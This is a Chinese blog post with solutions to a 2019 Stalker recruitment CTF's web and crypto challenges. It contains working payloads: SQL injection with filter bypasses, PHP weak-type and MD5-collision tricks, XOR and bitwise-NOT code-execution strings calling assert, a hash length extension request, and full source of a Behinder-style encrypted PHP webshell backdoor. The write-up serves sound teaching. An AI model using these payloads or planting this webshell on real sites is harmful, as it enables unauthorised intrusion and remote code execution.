<!DOCTYPE html>





<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.2">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.2">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.2">
  <link rel="mask-icon" href="/images/logo.svg?v=7.4.2" color="#222">

<link rel="stylesheet" href="/css/main.css?v=7.4.2">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '7.4.2',
    exturl: false,
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    bookmark: {"enable":false,"color":"#222","save":"auto"},
    fancybox: false,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: 'search.xml',
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: 'Copy',
      copy_success: 'Copied',
      copy_failure: 'Copy failed'
    },
    sidebarPadding: 40
  };
</script>

  <meta name="description" content="WEB来签个到吧这个题考脑洞，打开链接一看url感觉不太对劲，是D0G.php，题目提示了不是DOG吗，所以访问DOG.php，提交得到flag。代码审计第一层是extract($_GET);可以变量覆盖，所以只要构造a和b值为空就行，具体payload如下">
<meta name="keywords" content="web,crypto">
<meta property="og:type" content="article">
<meta property="og:title" content="2019 Stalker招新web和crypto题解">
<meta property="og:url" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;10&#x2F;2019-Stalker%E6%8B%9B%E6%96%B0web-crypto%E9%A2%98%E8%A7%A3&#x2F;index.html">
<meta property="og:site_name" content="LiM&#39;s blog">
<meta property="og:description" content="WEB来签个到吧这个题考脑洞，打开链接一看url感觉不太对劲，是D0G.php，题目提示了不是DOG吗，所以访问DOG.php，提交得到flag。代码审计第一层是extract($_GET);可以变量覆盖，所以只要构造a和b值为空就行，具体payload如下">
<meta property="og:locale" content="en">
<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;10&#x2F;2019-Stalker%E6%8B%9B%E6%96%B0web-crypto%E9%A2%98%E8%A7%A3&#x2F;1575960389583.png">
<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;10&#x2F;2019-Stalker%E6%8B%9B%E6%96%B0web-crypto%E9%A2%98%E8%A7%A3&#x2F;1575963280140.png">
<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;10&#x2F;2019-Stalker%E6%8B%9B%E6%96%B0web-crypto%E9%A2%98%E8%A7%A3&#x2F;1575963387585.png">
<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;10&#x2F;2019-Stalker%E6%8B%9B%E6%96%B0web-crypto%E9%A2%98%E8%A7%A3&#x2F;1575969352064.png">
<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;10&#x2F;2019-Stalker%E6%8B%9B%E6%96%B0web-crypto%E9%A2%98%E8%A7%A3&#x2F;1575969393937.png">
<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;10&#x2F;2019-Stalker%E6%8B%9B%E6%96%B0web-crypto%E9%A2%98%E8%A7%A3&#x2F;1575964690885.png">
<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;10&#x2F;2019-Stalker%E6%8B%9B%E6%96%B0web-crypto%E9%A2%98%E8%A7%A3&#x2F;1575965348579.png">
<meta property="og:updated_time" content="2020-02-17T06:43:22.824Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;10&#x2F;2019-Stalker%E6%8B%9B%E6%96%B0web-crypto%E9%A2%98%E8%A7%A3&#x2F;1575960389583.png">
  <link rel="canonical" href="https://li1m.github.io/2019/12/10/2019-Stalker%E6%8B%9B%E6%96%B0web-crypto%E9%A2%98%E8%A7%A3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: false,
    isPost: true,
    isPage: false,
    isArchive: false
  };
</script>

  <title>2019 Stalker招新web和crypto题解 | LiM's blog</title>
  








  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">LiM's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
      
      
        
        
        <li class="menu-item menu-item-home">
      
    

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>

  </li>
      
    
      
      
        
        
        <li class="menu-item menu-item-about">
      
    

    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>

  </li>
      
    
      
      
        
        
        <li class="menu-item menu-item-tags">
      
    

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>

  </li>
      
    
      
      
        
        
        <li class="menu-item menu-item-archives">
      
    

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>

  </li>
      
    
      
      
        
        
        <li class="menu-item menu-item-friends">
      
    

    <a href="/friends/" rel="section"><i class="fa fa-fw fa-paw"></i>friends</a>

  </li>
      
    
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger">
          <i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
    
  </ul>

</nav>
  <div class="site-search">
    <div class="popup search-popup">
    <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocorrect="off" autocapitalize="none"
           placeholder="Searching..." spellcheck="false"
           type="text" id="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result"></div>

</div>
<div class="search-pop-overlay"></div>

  </div>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
            

          <div class="content">
            

  <div class="posts-expand">
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
    <link itemprop="mainEntityOfPage" href="https://Li1M.github.io/2019/12/10/2019-Stalker%E6%8B%9B%E6%96%B0web-crypto%E9%A2%98%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiM">
      <meta itemprop="description" content="念念不忘，必有回响">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LiM's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            2019 Stalker招新web和crypto题解
            

          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-12-10 13:39:36" itemprop="dateCreated datePublished" datetime="2019-12-10T13:39:36+08:00">2019-12-10</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-02-17 14:43:22" itemprop="dateModified" datetime="2020-02-17T14:43:22+08:00">2020-02-17</time>
              </span>
            
          

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
          
          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
              
                <span class="post-meta-item-text">Symbols count in article: </span>
              
              <span>15k</span>
            </span>
          
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
              
                <span class="post-meta-item-text">Reading time &asymp;</span>
              
              <span>13 mins.</span>
            </span>
          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="来签个到吧"><a href="#来签个到吧" class="headerlink" title="来签个到吧"></a>来签个到吧</h2><p>这个题考脑洞，打开链接一看url感觉不太对劲，是D0G.php，题目提示了不是DOG吗，所以访问DOG.php，提交得到flag。</p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>第一层是extract($_GET);可以变量覆盖，所以只要构造a和b值为空就行，具体payload如下</p><a id="more"></a>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.103.62.94:8080/t/3/index.php?a=&amp;b=</span><br></pre></td></tr></table></figure>

<p>得到第二层地址，把GET id的值json解码然后键key对应的值与dm+in比较相等输出flag，注意+在url解码后是空格</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://47.103.62.94:8080/t/3/1.php?id=&#123;&quot;key&quot;:&quot;dm%2bin&quot;&#125;		//%2b为+号的url编码</span><br><span class="line">http://47.103.62.94:8080/t/3/1.php?id=&#123;&quot;key&quot;:0&#125;		//也可以这样，用php的弱类型比较，整型与字符型比较时字符型会保留前面的数字与整型比较，这里&quot;dm+in&quot;没有数字所以为0</span><br></pre></td></tr></table></figure>

<p>得到GNalVNrh2PqsbR0-cOLEUPKJx页面title有说XXencode，网上找一个在线XXdecode的网站解码就行。</p>
<h2 id="Look-at-my-wife"><a href="#Look-at-my-wife" class="headerlink" title="Look at my wife"></a>Look at my wife</h2><p>打开链接是md5的强碰撞，去网上找一下，这里直接用payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//sec.jxust.edu.cn:8892/?username=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;password=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span></span><br></pre></td></tr></table></figure>

<p>得到Flag:IZQWWZK7MZWDIZ27NFJV6SLOL5GVSV2JIZCS42DUNVWA====，base32解码得到Fake_fl4g_iS_In_MYWIFE.html进去MYWIFE.html页面，看了下源码，有个HK416_NO.1.docx，把下下来就行，打开看到一张图片，图片后面有白颜色的代码，是一个加密过程</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password=<span class="string">"=pJovuTsLMJoRSwozO2ZtEIqP1TozAas"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">$_o=strrev($str);</span><br><span class="line"><span class="comment">// echo $_o;&#125;</span></span><br><span class="line"><span class="keyword">for</span>($_0=<span class="number">0</span>; $_0&lt;strlen($_o);$_0++)&#123;$_c=substr($_o,$_0,<span class="number">1</span>);</span><br><span class="line">$__=ord($_c)+<span class="number">1</span>;</span><br><span class="line">$_c=chr($__);</span><br><span class="line">$_=$_.$_c;&#125;</span><br><span class="line"><span class="keyword">return</span> str_rot13(strrev(base64_encode($_)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">逆向加密算法，解密$password就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>根据条件写出解密算法，跑一下就有flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$a=<span class="string">'flag&#123;WelC0me_2_StAlker&#125;'</span>;</span><br><span class="line">$password=<span class="string">"=pJovuTsLMJoRSwozO2ZtEIqP1TozAas"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $_o=strrev($str);</span><br><span class="line">    <span class="keyword">for</span>($_0=<span class="number">0</span>; $_0&lt;strlen($_o);$_0++)&#123;$_c=substr($_o,$_0,<span class="number">1</span>);</span><br><span class="line">        $__=ord($_c)+<span class="number">1</span>;</span><br><span class="line">        $_c=chr($__);</span><br><span class="line">        $_=$_.$_c;&#125;</span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode($_)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $_o=base64_decode(strrev(str_rot13($str)));</span><br><span class="line">    <span class="keyword">for</span>($_0=<span class="number">0</span>; $_0&lt;strlen($_o);$_0++)&#123;$_c=substr($_o,$_0,<span class="number">1</span>);</span><br><span class="line">        $__=ord($_c)<span class="number">-1</span>;</span><br><span class="line">        $_c=chr($__);</span><br><span class="line">        $_=$_.$_c;&#125;</span><br><span class="line">    <span class="keyword">return</span> strrev($_);</span><br><span class="line">&#125;</span><br><span class="line">var_dump(encode($a));</span><br><span class="line">var_dump(decode($password));</span><br></pre></td></tr></table></figure>

<h2 id="eazysql"><a href="#eazysql" class="headerlink" title="eazysql"></a>eazysql</h2><p>考察sql注入，过滤了一些关键字为空可以双写绕过，过滤了注释字符，考虑一下闭合后面字符就行，这里用xpath注入。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://sec.jxust.edu.cn:8893/login.php?username=1&amp;password=1' aandnd updatexml(1,concat(0x7e,(<span class="keyword">SELECT</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>) oorr <span class="string">'1'</span>=<span class="string">'1    //查链接数据库</span></span><br><span class="line"><span class="string">http://sec.jxust.edu.cn:8893/login.php?username=1&amp;password=1'</span> aandnd updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(selselectect <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> infoorrmation_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>) oorr <span class="string">'1'</span>=<span class="string">'1    //查表名</span></span><br><span class="line"><span class="string">http://sec.jxust.edu.cn:8893/login.php?username=1&amp;password=1'</span> aandnd updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(seleselectct <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> infoorrmation_schema.columns <span class="keyword">where</span> table_name=<span class="string">"Sta1KeL"</span>),<span class="number">0x7e</span>),<span class="number">1</span>) oorr <span class="string">'1'</span>=<span class="string">'1    //查列名</span></span><br><span class="line"><span class="string">http://sec.jxust.edu.cn:8893/login.php?username=1&amp;password=1'</span> aandnd updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(seselectlect <span class="keyword">group_concat</span>(flag) <span class="keyword">from</span> Sta1KeL),<span class="number">0x7e</span>),<span class="number">1</span>) oorr <span class="string">'1'</span>=<span class="string">'1    //读数据</span></span><br></pre></td></tr></table></figure>

<h2 id="Fake-bypass"><a href="#Fake-bypass" class="headerlink" title="Fake_bypass"></a>Fake_bypass</h2><p>网上可以找到原题，就是无数字字母getshell，可以通过异或构造出_GET进行绕过.</p>
<p><img src="1575960389583.png" alt="1575960389583"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.43.117:8894/?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=readfile(&quot;flag.php&quot;);		//提示flag在flag.php读这个文件得到flag</span><br></pre></td></tr></table></figure>

<h2 id="你了解webshell吗"><a href="#你了解webshell吗" class="headerlink" title="你了解webshell吗"></a>你了解webshell吗</h2><p>考察冰蝎马二进制传输过waf的原理，网上有很多解析，随便找一下就行，打开链接是个欢迎页面，提示了有后门，所以扫一下目录发现shell.php存在，外面用了一个师傅的免杀马，就是通过异或出create_function执行命令的，把里面的base64解码，得到要执行的php内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $key=substr(md5(uniqid(rand())),<span class="number">15</span>);</span><br><span class="line">    $_SESSION[<span class="string">'k'</span>]=$key;</span><br><span class="line">    <span class="keyword">print</span> $key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $key=$_SESSION[<span class="string">'k'</span>];</span><br><span class="line">	$post=file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line">	<span class="keyword">if</span>(!extension_loaded(<span class="string">'openssl'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$t=<span class="string">"base64_"</span>.<span class="string">"decode"</span>;</span><br><span class="line">		$post=$t($post.<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">    			 $post[$i] = $post[$i]^$key[$i+<span class="number">1</span>&amp;<span class="number">14</span>];</span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		$post=openssl_decrypt($post, <span class="string">"AES256"</span>, $key);</span><br><span class="line">	&#125;</span><br><span class="line">    $arr=explode(<span class="string">'|'</span>,$post);</span><br><span class="line">    $func=$arr[<span class="number">0</span>];</span><br><span class="line">    $params=$arr[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">($p)</span> </span>&#123;<span class="keyword">eval</span>($p.<span class="string">""</span>);&#125;&#125;</span><br><span class="line">    @call_user_func(<span class="keyword">new</span> C(),$params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这就是一个冰蝎php后门，大概内容就是通过传参pass获得key，用于下面的解密，然后判断是否有openssl扩展，有就用AES256解密POST传的参数，没有就base64编码POST传的参数一位一位与key异或，最后把POST的值eval执行。这个题是存在openssl扩展的，所以直接用AES256解密就行。</p>
<p><img src="1575963280140.png" alt="1575963280140"></p>
<p>首先通过GET传参pass获得key，把key代入下面加密代码，cmd是要执行的命令，POST传cmd的值就能执行命令，探测得到flag在根目录，读一下就能得到flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$key=<span class="string">'e68c9ddec9974df73'</span>;</span><br><span class="line">	$cmd=<span class="string">'eval|readfile("../../../../flag");'</span>;</span><br><span class="line">	$cmd=openssl_encrypt($t, <span class="string">"AES256"</span>, $key);</span><br><span class="line">	var_dump($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="1575963387585.png" alt="1575963387585"></p>
<h2 id="eazy-hash"><a href="#eazy-hash" class="headerlink" title="eazy_hash"></a>eazy_hash</h2><p>打开链接，发现cookie的值很奇怪，将cookie对应flag的值改为1，出现源码，</p>
<p><img src="1575969352064.png" alt="1575969352064"></p>
<p>发现考hash长度扩展攻击，去网上找一下hash长度扩展攻击，也就是如果我们知道secret的长度&amp;data的值&amp;secret+data的MD5值，我们就能构造出secret+data+其他值的MD5，这里用hashpump，根据题意如下构造，返回的结果即是要用的payload，把/x换成%</p>
<p><img src="1575969393937.png" alt="1575969393937"></p>
<p>请求报文</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /t/4/index.php HTTP/1.1</span><br><span class="line">Host: 47.103.62.94:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: sample-hash=faa3f6dfec1fff03a413f5482110efeb; flag=1;set=165b40d54846374d6c51a62574cdeb50;</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 164</span><br><span class="line"></span><br><span class="line">cat=www&amp;dog=mmm%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80%00%00%00%00%00%00%00hello</span><br></pre></td></tr></table></figure>

<p>当然也有简单的方法，可以两次url编码绕过，因为代码内部又url解码了一次，所以只需POST传参cat=www&amp;dog=mm%256D即可，cookie里面set的值为sample-hash的值，请求报文如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /t/4/index.php HTTP/1.1</span><br><span class="line">Host: 47.103.62.94:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 19</span><br><span class="line">Origin: http://47.103.62.94:8080</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://47.103.62.94:8080/t/4/index.php</span><br><span class="line">Cookie: flag=1;set=faa3f6dfec1fff03a413f5482110efeb;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">cat=www&amp;dog=mm%256D</span><br></pre></td></tr></table></figure>

<h2 id="Real-bypass"><a href="#Real-bypass" class="headerlink" title="Real_bypass"></a>Real_bypass</h2><p>还是绕过，这次过滤的更多，可以这样构造payload，~是取反的意思</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(~%9E%8C%8C%9A%8D%8B)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()));</span><br><span class="line">//(assert)((next)((getallheaders)()));</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'assert'</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$a);	<span class="comment">//取反的字符串可以这样得到</span></span><br></pre></td></tr></table></figure>

<p>所以构造如下请求，得到flag</p>
<p><img src="1575964690885.png" alt="1575964690885"></p>
<h2 id="你真的懂php弱类型吗？"><a href="#你真的懂php弱类型吗？" class="headerlink" title="你真的懂php弱类型吗？"></a>你真的懂php弱类型吗？</h2><p>查看源码，也是json_decodePOST传参cat的值，将cat的name键对应的值与md5($flag)比较，md5($flag)返回的是一个字符类型，是==弱比较，整型与字符型弱比较时字符型会保留前面的数字与整型比较，所以只要知道md5($flag)返回的字符串前面是什么数字就能构造name的值与其相等，所以爆破</p>
<p><img src="1575965348579.png" alt="1575965348579"></p>
<p>POST传参cat={“name”:905}，name为905时得到了flag</p>
<h2 id="Simple-upload"><a href="#Simple-upload" class="headerlink" title="Simple upload"></a>Simple upload</h2><p>上传.jpg|.png|.gif格式文件，只要文件内容包含了eval就有flag。</p>
<hr>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Crypto-qiandao"><a href="#Crypto-qiandao" class="headerlink" title="Crypto_qiandao"></a>Crypto_qiandao</h2><p>凯撒解密，列出所有组合，然后将组和的内容分别base64解码，即可得到flag</p>
